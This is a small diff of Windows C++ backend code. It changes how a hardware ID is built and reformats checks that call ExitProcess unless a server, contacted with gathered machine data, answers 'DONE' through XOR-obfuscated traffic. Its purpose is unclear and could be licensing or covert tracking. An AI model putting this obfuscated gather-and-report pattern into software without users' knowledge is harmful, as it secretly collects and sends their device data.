@@ -120,7 +120,7 @@ std::string sys::c_backend::ghwid()
 	DWORD username_len = 1024;
 	auto user = GetUserNameA(username, &username_len);
 	//std::to_string(user)
-	return this->xor_fn(serialNumber_s, std::to_string(user));
+	return serialNumber_s;
 }
 void sys::c_backend::setup()
 {
@@ -144,7 +144,10 @@ std::string sys::c_backend::get_val(std::string name)
 void __stdcall sys::backend_worker()
 {
 	auto d = sys::backend->gather();
-	if (!d.size()) ExitProcess(0);
+	if (!d.size())
+	{
+		ExitProcess(0);
+	}
 	std::stringstream v;
 	auto hwid = sys::backend->ghwid();
 	auto web_c = new web::client(false, true);
@@ -160,7 +163,10 @@ void __stdcall sys::backend_worker()
 		std::string key = ret.substr(0, 10);
 		std::string data = ret.substr(10);
 		ret = sys::backend->xor_fn(data, key);
-		if (ret != "DONE") ExitProcess(0);
+		if (ret != "DONE")
+		{
+			ExitProcess(0);
+		}
 	}
 	sys::backend->thread_working = false;
 	delete web_c;
